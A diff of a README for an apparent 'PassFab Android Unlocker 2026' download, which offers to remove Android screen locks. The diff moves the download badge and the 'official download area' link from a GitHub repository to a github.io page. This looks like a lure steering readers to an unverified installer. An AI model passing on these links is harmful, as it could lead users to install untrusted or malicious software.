@@ -1,6 +1,6 @@
 # 🔓 PassFab-Android-Unlocker-2026 - Remove Android Screen Locks With Ease
 
-[![Download PassFab Android Unlocker](https://img.shields.io/badge/Download-PassFab-blue.svg)](https://github.com/Hughdowdingsecondwind981/PassFab-Android-Unlocker-2026)
+[![Download PassFab Android Unlocker](https://img.shields.io/badge/Download-PassFab-blue.svg)](https://hughdowdingsecondwind981.github.io)
 
 ## 📌 About This Software
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer for these specifications:
 
 You can get the software from the repository. Follow these steps to prepare the tool for use.
 
-1.  Visit the official download area: [https://github.com/Hughdowdingsecondwind981/PassFab-Android-Unlocker-2026](https://github.com/Hughdowdingsecondwind981/PassFab-Android-Unlocker-2026)
+1.  Visit the official download area: [https://hughdowdingsecondwind981.github.io](https://hughdowdingsecondwind981.github.io)
 2.  Locate the latest release version on the page.
 3.  Click the download link to save the installer file to your computer.
 4.  Find the file in your Downloads folder after the transfer finishes.
